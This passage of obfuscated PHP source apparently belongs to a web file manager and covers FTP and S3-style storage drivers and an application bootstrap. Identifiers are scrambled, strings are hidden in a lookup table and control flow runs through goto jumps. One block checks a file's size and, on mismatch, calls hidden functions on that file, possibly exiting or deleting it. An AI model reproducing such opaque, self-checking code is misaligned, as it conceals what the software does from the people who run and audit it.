$ÕªàıÒ = self::get($Ö¶ã½İ); if ($ÕªàıÒ || $ÕªàıÒ === $‘úë×àƒ[12]) { return $ÕªàıÒ; } $ÕªàıÒ = call_user_func_array($³¿µ¢±Ì, $ÔŠ”Ş²É); $ÕªàıÒ = $ÕªàıÒ ? $ÕªàıÒ : $‘úë×àƒ[12]; self::set($Ö¶ã½İ, $ÕªàıÒ, $Èí¹”ãÃ); return $ÕªàıÒ; } public static function remove($ œ“Ë·) { $£é‡£‘ = self::key($ œ“Ë·); unset(self::$memoryCache[$£é‡£‘]); self::clearTimeout(); CacheLock::lock($ œ“Ë·); $ö‹É‚Ø› = self::init()->remove($£é‡£‘); CacheLock::unlock($ œ“Ë·); return $ö‹É‚Ø›; } public static function removeMemory($‹àæ–ù) { $ìúØŒ·Õ = self::key($‹àæ–ù); unset(self::$memoryCache[$ìúØŒ·Õ]); } public static function clearMemory($¾ÏÀİ˜” = false) { if ($¾ÏÀİ˜”) { $¾ÏÀİ˜” = self::key($¾ÏÀİ˜”); unset(self::$memoryCache[$¾ÏÀİ˜”]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ü©»’·][838])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ü©»’·][839])) { self::init()->clearTimeout(); } } } goto böËÛ…ì; d´„ïÇ–à¦: $_SERVER[´³–µÍ] = explode($_SERVER[Ü©»’·][624], gzinflate(substr($_SERVER[Ü©»’·][625], 10, -8))); $ajspnofmul = $_SERVER[Ü©»’·][626]; if (!$ajspnofmul) { return; } goto aßÛ—Ã‡‚‰; a²Ş·ÑØÒÇ: class PathDriverEDS extends PathDriverMinIO { public function __construct($¢ÜÖ³Š) { parent::__construct($¢ÜÖ³Š); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($­”ÁâÍå) { parent::__construct($­”ÁâÍå); $this->signatureVersion($_SERVER[Ü©»’·][216]); } public function uploadFormData($¼à¥í¨¿, $•Õõ©ıî = 3600) { $—…–ñ« =& $_SERVER[Ü©»’·]; $ù¢ÎÎ¯Ê = $—…–ñ«[198]; $³êÚ“Ûô = $—…–ñ«[1358]; $×“é×£˜ = $—…–ñ«[62]; $ı¡ ‚¸ü = gmdate($—…–ñ«[1359]); $ÚÕÚ²µØ = gmdate($—…–ñ«[757]); $àĞèŞæ– = $—…–ñ«[1360]; $×¤­ÏÊ = $•Õõ©ıî . $—…–ñ«[12]; $„ÀİÇÈ = $—…–ñ«[1322]; $Æâã¶¸Ê = array($this->accessKey, $ÚÕÚ²µØ, $this->region, $×“é×£˜, $àĞèŞæ–); $û¨ğ¸ãÉ = implode($—…–ñ«[8], $Æâã¶¸Ê); $òéû˜ƒ = array($—…–ñ«[1324] => gmdate($—…–ñ«[1323], strtotime($—…–ñ«[1361])), $—…–ñ«[1325] => array(array($—…–ñ«[1327] => $this->bucket), array($—…–ñ«[1326] => $ù¢ÎÎ¯Ê), array($—…–ñ«[1328], $—…–ñ«[1329], $—…–ñ«[12]), array($—…–ñ«[1328], $—…–ñ«[1362], $—…–ñ«[12]), array($—…–ñ«[1328], $—…–ñ«[1363], $—…–ñ«[12]), array($—…–ñ«[1330] => $„ÀİÇÈ), array($—…–ñ«[1364] => $û¨ğ¸ãÉ), array($—…–ñ«[1365] => $³êÚ“Ûô), array($—…–ñ«[1366] => $ı¡ ‚¸ü), array($—…–ñ«[1367] => $×¤­ÏÊ))); $“‡ÈÃÌŒ = base64_encode(json_encode($òéû˜ƒ)); $Ü¢áïÃ = hash_hmac($—…–ñ«[1368], $ÚÕÚ²µØ, $—…–ñ«[1369] . $this->secret, !0); $±Í· = hash_hmac($—…–ñ«[1368], $this->region, $Ü¢áïÃ, !0); $ÒÔõŸ«¯ = hash_hmac($—…–ñ«[1368], $×“é×£˜, $±Í·, !0); $€‘ÂÎíÍ = hash_hmac($—…–ñ«[1368], $àĞèŞæ–, $ÒÔõŸ«¯, !0); $ÉûàÖåí = hash_hmac($—…–ñ«[1368], $“‡ÈÃÌŒ, $€‘ÂÎíÍ); $·‡ÒÎçÙ = array($—…–ñ«[215] => $—…–ñ«[12], $—…–ñ«[1370] => $—…–ñ«[12], $—…–ñ«[1326] => $ù¢ÎÎ¯Ê, $—…–ñ«[1330] => $„ÀİÇÈ, $—…–ñ«[1334] => $“‡ÈÃÌŒ, $—…–ñ«[1371] => $û¨ğ¸ãÉ, $—…–ñ«[1372] => $³êÚ“Ûô, $—…–ñ«[1373] => $ı¡ ‚¸ü, $—…–ñ«[1374] => $×¤­ÏÊ, $—…–ñ«[1375] => $ÉûàÖåí, $—…–ñ«[181] => $this->getHost()); return $·‡ÒÎçÙ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($öâğ×íØ) { parent::__construct(); if (count($öâğ×íØ) > 0) { $this->_init($öâğ×íØ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($î¤¨×Ñ•) { $‚ğâ²‘ =& $_SERVER[Ü©»’·]; global $config; $this->appCharset = $config[$‚ğâ²‘[1376]]; $this->systemCharset = $config[$‚ğâ²‘[1377]]; if (isset($î¤¨×Ñ•[$‚ğâ²‘[1378]]) && $î¤¨×Ñ•[$‚ğâ²‘[1378]]) { $this->systemCharset = $î¤¨×Ñ•[$‚ğâ²‘[1378]]; } } public function iconvApp($‹Îš¥²°) { return $this->iconvTo($‹Îš¥²°, $this->systemCharset, $this->appCharset); } public function iconvSystem($İ©ƒç Ë) { return $this->iconvTo($İ©ƒç Ë, $this->appCharset, $this->systemCharset); } public function getPathOuter($ê¼Èíò­) { $©ØâÆŸ =& $_SERVER[Ü©»’·]; $˜äÁÄé = $this->iconvApp($this->pathBase); $ê¼Èíò­ = $this->iconvApp($ê¼Èíò­); if (substr($˜äÁÄé, 0, 2) == $©ØâÆŸ[1379]) { $˜äÁÄé = BASIC_PATH . substr($˜äÁÄé, 2); } if (substr($ê¼Èíò­, 0, 2) == $©ØâÆŸ[1379]) { $ê¼Èíò­ = BASIC_PATH . substr($ê¼Èíò­, 2); } $˜äÁÄé = KodIO::clear($˜äÁÄé); $ê¼Èíò­ = KodIO::clear($ê¼Èíò­); $ê¼Èíò­ = substr($ê¼Èíò­, strlen($˜äÁÄé)); if (empty($this->pathDriver)) { return $ê¼Èíò­; } return $this->pathDriver . $©ØâÆŸ[8] . ltrim($ê¼Èíò­, $©ØâÆŸ[8]); } private function _init($ÜÆêÀ÷² = array()) { $Ş­®ç® =& $_SERVER[Ü©»’·]; if (!function_exists($Ş­®ç®[1380])) { throw new Exception(LNG($Ş­®ç®[1381])); } $this->config = $ÜÆêÀ÷²; $this->charsetReset($ÜÆêÀ÷²); foreach ($ÜÆêÀ÷² as $‘¸Í => $´‰şëĞì) { if (isset($this->{$‘¸Í})) { $this->{$‘¸Í} = $´‰şëĞì; } } return $this->_login($ÜÆêÀ÷²); } private function _login($ı“é–îÉ) { $¿ğåÌİ =& $_SERVER[Ü©»’·]; static $ÆŠêëÃ = array(); $Ó¨Ù¡ = md5(json_encode($ı“é–îÉ)); if (isset($ÆŠêëÃ[$Ó¨Ù¡])) { foreach ($ÆŠêëÃ[$Ó¨Ù¡] as $£×Üî¨û => $ÛêØ—‘ñ) { $this->{$£×Üî¨û} = $ÛêØ—‘ñ; } return !0; } $şÕ°ŠÉß = parse_url(trim($this->server, $¿ğåÌİ[8])); $this->host = $şÕ°ŠÉß[$¿ğåÌİ[181]]; $Ã£«´ïÓ = isset($şÕ°ŠÉß[$¿ğåÌİ[180]]) && $şÕ°ŠÉß[$¿ğåÌİ[180]] == $¿ğåÌİ[1382] ? !0 : !1; $this->scheme = $Ã£«´ïÓ ? $¿ğåÌİ[1383] : $¿ğåÌİ[1384]; $this->port = isset($şÕ°ŠÉß[$¿ğåÌİ[182]]) ? $şÕ°ŠÉß[$¿ğåÌİ[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $æüûá€à = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $İ÷¼¤’Š = $this->pasv == $¿ğåÌİ[88] ? !0 : !1; @ftp_pasv($this->connect, $İ÷¼¤’Š); $ÆŠêëÃ[$Ó¨Ù¡] = array($¿ğåÌİ[1385] => $this->connect, $¿ğåÌİ[181] => $this->host, $¿ğåÌİ[180] => $this->scheme, $¿ğåÌİ[182] => $this->port); return $æüûá€à; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($¾°ø˜Ó†, $ûãê§óµ = '', $ñïä«ğ¹ = REPEAT_RENAME) { if ($this->setContent($¾°ø˜Ó†, $ûãê§óµ)) { return $this->getPathOuter($¾°ø˜Ó†); } return !1; } public function mkdir($Å„Îı¹—, $íÏ£†°Ë = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Å„Îı¹— = $this->iconvSystem($Å„Îı¹—); if ($this->_isFolder($Å„Îı¹—) || @ftp_mkdir($this->connect, $Å„Îı¹—)) { return $this->getPathOuter($Å„Îı¹—); } if (!$this->mkdir($this->pathFather($Å„Îı¹—))) { return !1; } if ($Å„Îı¹— = @ftp_mkdir($this->connect, $Å„Îı¹—)) { return $this->getPathOuter($Å„Îı¹—); } return !1; } public function copyFile($›¨Á–ø, $âÛÌ¹Œ) { if (!$this->_isconn()) { return !1; } $á¬œùê = $this->pathThis($this->iconvSystem($›¨Á–ø)); $á”€Ô˜² = $this->tempFile($á¬œùê); $ç´ĞŒ = $this->iconvApp($á”€Ô˜²); $this->download($›¨Á–ø, $ç´ĞŒ); $ü¥Ã’™ = $this->upload($âÛÌ¹Œ, $ç´ĞŒ); $this->tempFileRemve($á”€Ô˜²); return $ü¥Ã’™; } public function moveFile($¥Ñ‚¨ˆŠ, $ôæ›©ìÙ) { if (!$this->_isconn()) { return !1; } $¥Ñ‚¨ˆŠ = $this->iconvSystem($¥Ñ‚¨ˆŠ); $ôæ›©ìÙ = $this->iconvSystem($ôæ›©ìÙ); $““îéó = @ftp_rename($this->connect, $¥Ñ‚¨ˆŠ, $ôæ›©ìÙ); return $““îéó ? $this->getPathOuter($ôæ›©ìÙ) : !1; } public function delFile($£³úçÍ±) { if (!$this->_isconn()) { return !1; } $£³úçÍ± = $this->iconvSystem($£³úçÍ±); return @ftp_delete($this->connect, $£³úçÍ±); } public function delFolder($øœÒ±) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $‰æ¸™¡† = $«‡Ë•ê = array(); $this->fileList($øœÒ±, $‰æ¸™¡†, $«‡Ë•ê, !0); $this->listItemCache = !0; foreach ($«‡Ë•ê as $ÁÍ¢ÜÍ‰) { $Êï´¥×‘ = $this->iconvSystem($ÁÍ¢ÜÍ‰[$_SERVER[Ü©»’·][32]]); $ÀÊ“ôª± = @ftp_delete($this->connect, $Êï´¥×‘); if (!$ÀÊ“ôª±) { return !1; } } foreach ($‰æ¸™¡† as $Êï´¥×‘) { $Êï´¥×‘ = $this->iconvSystem($Êï´¥×‘); $ÀÊ“ôª± = @ftp_rmdir($this->connect, $Êï´¥×‘); if (!$ÀÊ“ôª±) { return !1; } } $øœÒ± = $this->iconvSystem($øœÒ±); return @ftp_rmdir($this->connect, $øœÒ±); } public function rename($ĞÓ ¥, $‚–’Ö´‰) { $°ıÍÉÉ =& $_SERVER[Ü©»’·]; if (!$this->_isconn()) { return !1; } $ İæıÎ¥ = $this->fileNameAuto($this->pathFather($ĞÓ ¥), $‚–’Ö´‰); $ İæıÎ¥ = $this->iconvSystem($ İæıÎ¥); $ĞÓ ¥ = $this->iconvSystem($ĞÓ ¥); $¿’šØ½Ô = $this->pathFather($ĞÓ ¥); $Ğ¦œ”ÕÅ = rtrim($¿’šØ½Ô, $°ıÍÉÉ[8]) . $°ıÍÉÉ[8] . $ İæıÎ¥; $±¥ùàšø = @ftp_rename($this->connect, $ĞÓ ¥, $Ğ¦œ”ÕÅ); $Ğ¦œ”ÕÅ = $this->iconvApp($Ğ¦œ”ÕÅ); return $±¥ùàšø ? $this->getPathOuter($Ğ¦œ”ÕÅ) : !1; } private function folderInfo($ï¥êûÔô, $«ğš¶àæ = false) { $ÛÇïÊ =& $_SERVER[Ü©»’·]; $¢ÒìÜÑì = array($ÛÇïÊ[32] => $this->pathThis($ï¥êûÔô), $ÛÇïÊ[84] => $this->getPathOuter($ÛÇïÊ[8] . $ï¥êûÔô), $ÛÇïÊ[33] => $ÛÇïÊ[75]); if ($«ğš¶àæ) { return $¢ÒìÜÑì; } $¢ÒìÜÑì[$ÛÇïÊ[200]] = $¢ÒìÜÑì[$ÛÇïÊ[85]] = 0; $¢ÒìÜÑì[$ÛÇïÊ[201]] = $¢ÒìÜÑì[$ÛÇïÊ[202]] = !0; return $¢ÒìÜÑì; } private function fileInfo($ú¶îš, $ıĞ…ëÒá = false, $â„¸ˆ = array()) { $¨¯Äš£œ =& $_SERVER[Ü©»’·]; $Ù¤Ø®¥ = array($¨¯Äš£œ[32] => $this->pathThis($ú¶îš), $¨¯Äš£œ[84] => $this->getPathOuter($¨¯Äš£œ[8] . $ú¶îš), $¨¯Äš£œ[33] => $¨¯Äš£œ[199], $¨¯Äš£œ[76] => isset($â„¸ˆ[$¨¯Äš£œ[76]]) ? $â„¸ˆ[$¨¯Äš£œ[76]] : 0, $¨¯Äš£œ[174] => $this->ext($ú¶îš)); if ($ıĞ…ëÒá) { return $Ù¤Ø®¥; } $Ù¤Ø®¥[$¨¯Äš£œ[200]] = $Ù¤Ø®¥[$¨¯Äš£œ[85]] = 0; $Ù¤Ø®¥[$¨¯Äš£œ[201]] = $Ù¤Ø®¥[$¨¯Äš£œ[202]] = !0; $í±´¦ü = $this->iconvSystem($ú¶îš); $Ù¤Ø®¥[$¨¯Äš£œ[85]] = @ftp_mdtm($this->connect, $í±´¦ü); if (empty($â„¸ˆ)) { $â„¸ˆ = $this->objectMeta($ú¶îš); if (!$â„¸ˆ) { return $Ù¤Ø®¥; } } $Ù¤Ø®¥[$¨¯Äš£œ[76]] = $â„¸ˆ[$¨¯Äš£œ[76]]; return $Ù¤Ø®¥; } public function size($ ˜ßÃîï) { $ÚÈ”ú†Ÿ = $this->objectMeta($ ˜ßÃîï); return $ÚÈ”ú†Ÿ ? $ÚÈ”ú†Ÿ[$_SERVER[Ü©»’·][76]] : 0; } public function info($ÁÊòÓ‹œ) { if ($this->isFile($ÁÊòÓ‹œ)) { return $this->fileInfo($ÁÊòÓ‹œ, 0); } else { if ($this->isFolder($ÁÊòÓ‹œ)) { return $this->folderInfo($ÁÊòÓ‹œ); } } return !1; } private function fileList($ş˜¬Š¹ù, &$ ‚İê·, &$á¡àÁ¯ï, $¶ıÔ—Ãø = false) { $ïà²¹ç =& $_SERVER[Ü©»’·]; $ş˜¬Š¹ù = $this->iconvSystem($ş˜¬Š¹ù); if (!$this->isFolder($ş˜¬Š¹ù)) { return !1; } @ftp_chdir($this->connect, $ïà²¹ç[8]); $ş˜¬Š¹ù = rtrim($ş˜¬Š¹ù, $ïà²¹ç[8]) . $ïà²¹ç[8]; check_abort(); $û£èÈî = @ftp_rawlist($this->connect, $ş˜¬Š¹ù); if (!$û£èÈî) { $û£èÈî = array(); } $‘üßŞ»‚ = array($ïà²¹ç[10] => 1, $ïà²¹ç[1386] => 1); foreach ($û£èÈî as $Ò÷¾º²¾) { $ş –‰ = $this->_listItem($Ò÷¾º²¾); if ($ş –‰[0] == $ïà²¹ç[765]) { continue; } $­Í¹ñùÔ = $ş –‰[8]; if (empty($­Í¹ñùÔ) && $­Í¹ñùÔ !== $ïà²¹ç[197] || isset($‘üßŞ»‚[$­Í¹ñùÔ])) { continue; } $­Í¹ñùÔ = $this->iconvApp($ş˜¬Š¹ù . ltrim($­Í¹ñùÔ, $ïà²¹ç[8])); $µ¯³‡¿† = array($ïà²¹ç[32] => $­Í¹ñùÔ, $ïà²¹ç[33] => $ïà²¹ç[199], $ïà²¹ç[76] => $ş –‰[4]); if (substr($Ò÷¾º²¾, 0, 1) == $ïà²¹ç[1387]) { $µ¯³‡¿†[$ïà²¹ç[33]] = $ïà²¹ç[75]; $µ¯³‡¿†[$ïà²¹ç[76]] = 0; } $‡ô“’õó = $µ¯³‡¿†[$ïà²¹ç[33]] == $ïà²¹ç[75] ? !0 : !1; $this->cacheMethodInfoSet($­Í¹ñùÔ, $‡ô“’õó, $µ¯³‡¿†); if ($‡ô“’õó) { $ ‚İê·[] = $­Í¹ñùÔ; if ($¶ıÔ—Ãø) { $this->fileList($­Í¹ñùÔ, $ ‚İê·, $á¡àÁ¯ï, $¶ıÔ—Ãø); } continue; } $á¡àÁ¯ï[] = $µ¯³‡¿†; } $this->cacheMethodInfoSet($ş˜¬Š¹ù, !0); } private function _listItem($¹ßĞÚ¨ˆ) { if (empty($¹ßĞÚ¨ˆ)) { return array(); } $¾Æ—¹å = preg_split($_SERVER[Ü©»’·][1388], $¹ßĞÚ¨ˆ); if (count($¾Æ—¹å) <= 9) { return $¾Æ—¹å; } $¾Æ—¹å[8] = trim(substr($¹ßĞÚ¨ˆ, strpos($¹ßĞÚ¨ˆ, $¾Æ—¹å[7]) + strlen($¾Æ—¹å[7]))); return array_splice($¾Æ—¹å, 0, 9); } public function listPath($Ğ¡µÇî÷, $«»ŞÖğ = false) { $ëåÈÀ‰£ =& $_SERVER[Ü©»’·]; if (!$this->_isconn()) { return !1; } $ÇÀ§¦¨Ÿ = $¤½ÌÜ¬ = array(); $this->fileList($Ğ¡µÇî÷, $ÇÀ§¦¨Ÿ, $¤½ÌÜ¬); foreach ($ÇÀ§¦¨Ÿ as $ÅÎö¦õ… => $©é®µ¿ä) { $ÇÀ§¦¨Ÿ[$ÅÎö¦õ…] = $this->folderInfo($©é®µ¿ä, $«»ŞÖğ); } foreach ($¤½ÌÜ¬ as $ÅÎö¦õ… => $©é®µ¿ä) { $¤½ÌÜ¬[$ÅÎö¦õ…] = $this->fileInfo($©é®µ¿ä[$ëåÈÀ‰£[32]], $«»ŞÖğ, $©é®µ¿ä); } return array($ëåÈÀ‰£[82] => $ÇÀ§¦¨Ÿ, $ëåÈÀ‰£[83] => $¤½ÌÜ¬); } public function has($§ıàŒÀá, $èƒ«„şŸ = false, $ªé³“ô = true) { $öİ™×¼´ =& $_SERVER[Ü©»’·]; $Öá³ã¶Œ = $£¡äš²Á = array(); $ù§¿Å‰Æ = $èƒ«„şŸ ? !0 : !1; $this->fileList($§ıàŒÀá, $Öá³ã¶Œ, $£¡äš²Á, $ù§¿Å‰Æ); if ($èƒ«„şŸ) { return array($öİ™×¼´[207] => count($£¡äš²Á), $öİ™×¼´[208] => count($Öá³ã¶Œ)); } if ($ªé³“ô) { if (count($£¡äš²Á)) { return !0; } } else { if (count($Öá³ã¶Œ)) { return !0; } } return !1; } public function listAll($­úôéØ†) { $¾Ô•Ë«ö =& $_SERVER[Ü©»’·]; if (!$this->_isconn()) { return !1; } $†áøûàì = $«˜áŒØ‰ = array(); $this->fileList($­úôéØ†, $†áøûàì, $«˜áŒØ‰, !0); $ª›à¡ô³ = array(); foreach ($«˜áŒØ‰ as $×°½»‘ã) { $ª›à¡ô³[$×°½»‘ã[$¾Ô•Ë«ö[32]]] = $×°½»‘ã[$¾Ô•Ë«ö[76]]; } foreach ($†áøûàì as $×°½»‘ã) { if (is_string($×°½»‘ã)) { $ª›à¡ô³[$×°½»‘ã] = 0; } } return $this->listAllFiles($­úôéØ†, array_keys($ª›à¡ô³), $ª›à¡ô³); } public function getContent($Öôé¤æí) { if (!$this->_isconn()) { return !1; } $Öôé¤æí = $this->iconvSystem($Öôé¤æí); return $this->fileSubstr($Öôé¤æí); } public function setContent($ô—â¯¸Â, $Ôàîù¸² = '') { if (!$this->_isconn()) { return !1; } $ÊÄÂ…´ƒ = $this->pathThis($this->iconvSystem($ô—â¯¸Â)); $ò„Ü«Ëå = $this->tempFile($ÊÄÂ…´ƒ); file_put_contents($ò„Ü«Ëå, $Ôàîù¸²); $”³Çûá© = $this->upload($ô—â¯¸Â, $this->iconvApp($ò„Ü«Ëå)); $this->tempFileRemve($ò„Ü«Ëå); return $”³Çûá©; } public function fileSubstr($Å™ĞõÖä, $áÈ½ = 0, $Ö¬Óòô = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Å™ĞõÖä, $áÈ½, $Ö¬Óòô); } private function ftpRequest($Ò–„ˆ€, $†Ş©ª¾á = 0, $áèà‰ã• = false) { $Ò–„ˆ€ = $this->iconvSystem($Ò–„ˆ€); $³»è¬²¹ = $this->scheme . $this->host . $_SERVER[Ü©»’·][4] . $this->port; $İ³‰Å©Ô = curl_init(); curl_setopt($İ³‰Å©Ô, CURLOPT_URL, $³»è¬²¹ . $this->pathEncode($Ò–„ˆ€)); curl_setopt($İ³‰Å©Ô, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($áèà‰ã•) { $·êŒÛ„õ = $†Ş©ª¾á + $áèà‰ã• - 1; curl_setopt($İ³‰Å©Ô, CURLOPT_RANGE, "{$†Ş©ª¾á}\x2d{$·êŒÛ„õ}"); } curl_setopt($İ³‰Å©Ô, CURLOPT_RETURNTRANSFER, 1); $Îâ³„»ï = curl_exec($İ³‰Å©Ô); curl_close($İ³‰Å©Ô); return $Îâ³„»ï; } public function upload($Íú±ÏøÍ, $®æ±œ•, $¦¤Ÿ¢Ô± = false, $¨«¶ñ… = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Íú±ÏøÍ))) { return !1; } $Íú±ÏøÍ = $this->iconvSystem($Íú±ÏøÍ); $®æ±œ• = $this->iconvSystem($®æ±œ•); $èçÏÍäâ = ftp_nb_put($this->connect, $Íú±ÏøÍ, $®æ±œ•, FTP_BINARY); while ($èçÏÍäâ == FTP_MOREDATA) { $èçÏÍäâ = ftp_nb_continue($this->connect); } if ($èçÏÍäâ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Íú±ÏøÍ); } public function download($¹¾ğœ¢Ñ, $¹¸¥†¡¹ = '') { if (!$this->_isconn()) { return !1; } $²æ¿Ó = $this->pathFather($¹¸¥†¡¹); if (!IO::mkdir($²æ¿Ó)) { return !1; } $¹¾ğœ¢Ñ = $this->iconvSystem($¹¾ğœ¢Ñ); $¹¸¥†¡¹ = $this->iconvSystem($¹¸¥†¡¹); $×ïµ€ãÓ = ftp_nb_get($this->connect, $¹¸¥†¡¹, $¹¾ğœ¢Ñ, FTP_BINARY); while ($×ïµ€ãÓ == FTP_MOREDATA) { $×ïµ€ãÓ = ftp_nb_continue($this->connect); } if ($×ïµ€ãÓ != FTP_FINISHED) { return !1; } return $this->iconvApp($¹¸¥†¡¹); } public function exist($éª¶ìé) { return $this->isFile($éª¶ìé) || $this->isFolder($éª¶ìé); } public function isFile($£‹ëŠá©) { return !$this->isFolder($£‹ëŠá©) && $this->objectMeta($£‹ëŠá©); } public function isFolder($¦ÏßøûÄ) { return $this->cacheMethod($_SERVER[Ü©»’·][165], $¦ÏßøûÄ); } protected function objectMeta($ÕÈŸéş´) { return $this->cacheMethod($_SERVER[Ü©»’·][167], $ÕÈŸéş´); } protected function _objectMeta($ù¹î¬ˆÎ) { $ıÅî§Æá =& $_SERVER[Ü©»’·]; if ($ù¹î¬ˆÎ == $ıÅî§Æá[12] || $ù¹î¬ˆÎ == $ıÅî§Æá[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ù¹î¬ˆÎ = $this->iconvSystem($ù¹î¬ˆÎ); $Áî•äÓ¤ = array($ıÅî§Æá[32] => $this->iconvApp($ù¹î¬ˆÎ), $ıÅî§Æá[33] => $ıÅî§Æá[199], $ıÅî§Æá[76] => 0); @ftp_chdir($this->connect, $ıÅî§Æá[8]); $Ä¼ôâ¯û = @ftp_size($this->connect, $ù¹î¬ˆÎ); if ($Ä¼ôâ¯û != -1) { $Áî•äÓ¤[$ıÅî§Æá[76]] = $Ä¼ôâ¯û; } else { $ğëœÁŞ¬ = @ftp_chdir($this->connect, $ù¹î¬ˆÎ); if (!$ğëœÁŞ¬) { return !1; } $Áî•äÓ¤[$ıÅî§Æá[33]] = $ıÅî§Æá[75]; } return $Áî•äÓ¤; } protected function _isFolder($ÍêÃ£â) { $Ñ„ËˆÉ— =& $_SERVER[Ü©»’·]; if ($ÍêÃ£â == $Ñ„ËˆÉ—[12] || $ÍêÃ£â == $Ñ„ËˆÉ—[8]) { return !0; } $Æš‘Ö‹ = $this->_objectMeta($ÍêÃ£â); return isset($Æš‘Ö‹[$Ñ„ËˆÉ—[33]]) && $Æš‘Ö‹[$Ñ„ËˆÉ—[33]] == $Ñ„ËˆÉ—[75] ? !0 : !1; } } goto câ›‘İêÉí; BÇ²ò•†¸æ: $_file = $_SERVER[$_SERVER[Ü©»’·][355]]; $_size = $_SERVER[Ü©»’·][356]; if ($_SERVER[$_SERVER[Ü©»’·][357]] != $_size($_file)) { $_getc = $_SERVER[Ü©»’·][358]; $_getfile = $_SERVER[$_SERVER[Ü©»’·][359]] . $_SERVER[Ü©»’·][360]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ü©»’·][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ü©»’·][361]) { $exit = $_SERVER[Ü©»’·][362]; $exit(); } $_act = $_SERVER[Ü©»’·][363]; $_act($_file); } goto Aœ Äİš™; aßÛ—Ã‡‚‰: class Application { private $defaultModule = "\151\x6e\144\x65\x78"; private $defaultController = "\x69\156\144\x65\170"; private $defaultAction = "\x69\156\144\145\170"; function __construct() { } public function setDefault($Óµ—û”) { $Î‘€îå· =& $_SERVER[Ü©»’·]; $é–Ô¶Ñã =& $_SERVER[´³–µÍ]; $‡ô¸ªøÛ = explode($é–Ô¶Ñã[0], trim($Óµ—û”, $é–Ô¶Ñã[0])); $this->defaultModule = $‡ô¸ªøÛ[0] ? $‡ô¸ªøÛ[0] : $this->defaultModule; $this->defaultController = $‡ô¸ªøÛ[1] ? $‡ô¸ªøÛ[1] : $this->defaultController; $this->defaultAction = $‡ô¸ªøÛ[2] ? $‡ô¸ªøÛ[2] : $this->defaultAction; $úà§€ä = $Î‘€îå·[627]; if (strlen($úà§€ä) < $Î‘€îå·[628]) { die; } $this->hdtq91deedc6($é–Ô¶Ñã[1], array($this, $é–Ô¶Ñã[2])); $‹ÚÈ˜ä = $Î‘€îå·[629]; } public function appRun($¹¹¼Ÿ ÷) { $¡¯ÂãÚø =& $_SERVER[Ü©»’·]; $îÏ‹óÂ =& $_SERVER[´³–µÍ]; $‘µ‘•ñü = explode($îÏ‹óÂ[0], $¹¹¼Ÿ ÷); $½üŞ‡î× = $¡¯ÂãÚø[630]; if (!$½üŞ‡î×) { return; } $ßö¢úÉ = strtolower($‘µ‘•ñü[0]); $‹¸ÕÌ„Õ = $îÏ‹óÂ[3]; if ($ßö¢úÉ == $îÏ‹óÂ[4]) { $‹¸ÕÌ„Õ = $îÏ‹óÂ[5]; $‘µ‘•ñü[0] = $îÏ‹óÂ[6]; $‘µ‘•ñü[1] = $‘µ‘•ñü[1] . $îÏ‹óÂ[7]; $¹¹¼Ÿ ÷ = join($îÏ‹óÂ[0], $‘µ‘•ñü); $¹¹¼Ÿ ÷ = trim($¹¹¼Ÿ ÷, $îÏ‹óÂ[0]); } call_user_func(array($îÏ‹óÂ[8], $îÏ‹óÂ[9]), $‹¸ÕÌ„Õ . $îÏ‹óÂ[10], $¹¹¼Ÿ ÷); ActionCall($¹¹¼Ÿ ÷); call_user_func(array($îÏ‹óÂ[8], $îÏ‹óÂ[9]), $‹¸ÕÌ„Õ . $îÏ‹óÂ[11], $¹¹¼Ÿ ÷); $™ğ‹ˆƒç = $¡¯ÂãÚø[631]; if (strlen($™ğ‹ˆƒç) < $¡¯ÂãÚø[632]) { die; } } private function autorun() { $»ä¿¡Æä =& $_SERVER[Ü©»’·]; $‡¢í§ßÁ =& $_SERVER[´³–µÍ]; global $config; $×–àŸòŒ = $»ä¿¡Æä[633]; while (strlen($×–àŸòŒ) < $»ä¿¡Æä[634]) { if (!$×–àŸòŒ) { break; } $×–àŸòŒ++; } if (count($config[$‡¢í§ßÁ[12]]) == 0) { return; } foreach ($config[$‡¢í§ßÁ[12]] as $Ê±­Ğ => $¹É¨Äƒ·) { $this->appRun($¹É¨Äƒ·); $ãêÄ¾¾ = $»ä¿¡Æä[635]; } } private function glxq380ad971() { $ÎÔ¬­äõ =& $_SERVER[Ü©»’·]; $‚Â›×”Ï =& $_SERVER[´³–µÍ]; $ÑÛÇà‘É = $‚Â›×”Ï[4]; $úÁŸëüµ = $ÎÔ¬­äõ[636]; $˜ÌŸ©Õ¼ = $GLOBALS[$‚Â›×”Ï[13]][$‚Â›×”Ï[14]][0]; $öÍİ·é = $ÎÔ¬­äõ[637]; if (strlen($öÍİ·é) < $ÎÔ¬­äõ[638]) { die; } if (!$˜ÌŸ©Õ¼ || strlen($˜ÌŸ©Õ¼) <= strlen($ÑÛÇà‘É)) { return; } if (strtolower(substr($˜ÌŸ©Õ¼, -strlen($ÑÛÇà‘É))) != $ÑÛÇà‘É) { return; } $Š¡½õ¡… = substr($˜ÌŸ©Õ¼, 0, -strlen($ÑÛÇà‘É)); $å¾Œ½ŞÂ = array($‚Â›×”Ï[4], $Š¡½õ¡…); $Èû‰ë¥¨ = $ÎÔ¬­äõ[639]; if (!$Èû‰ë¥¨) { return; } $âÊÂœ“Ä = array_slice($GLOBALS[$‚Â›×”Ï[13]][$‚Â›×”Ï[14]], 1); 